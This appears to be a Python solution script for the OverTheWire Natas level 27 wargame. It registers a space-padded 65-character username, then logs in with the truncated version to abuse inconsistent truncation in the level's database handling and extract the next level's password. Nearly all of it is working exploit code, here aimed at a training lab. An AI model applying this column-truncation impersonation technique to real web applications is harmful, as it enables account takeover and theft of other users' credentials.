import re
import requests

# the password for this challenge (natas27)
natas27_password = ""

# the username we want to get the password for
username = "natas28"

# the base URL for the server
url = "http://natas27.natas.labs.overthewire.org"

# create a session object to persist cookies across requests
session = requests.Session()
session.auth = ("natas27", natas27_password)

# the crafted username which is exactly 65 characters long
crafted_username = username + " " * (64 - len(username)) + "x"

# make the initial request to create the user with the crafted username
response = session.post(
   f"{url}/index.php",
   data={"username": crafted_username, "password": ""},
   headers={"Content-Type": "application/x-www-form-urlencoded"},
)

# the crafted username is now a valid new user in the database
# login as that user to exploit the inconsistent handling in `dumpData` and get the password
crafted_username = username + " " * (64 - len(username))

response = session.post(
   f"{url}/index.php",
   data={"username": crafted_username, "password": ""},
   headers={"Content-Type": "application/x-www-form-urlencoded"},
)

# extract the password from the response using regex
password_regex = r"\[password\] (=&gt;|=>) (?P<password>[a-zA-Z0-9]{32})"
password_match = re.search(password_regex, response.text)
password = password_match.group("password")

print(password)
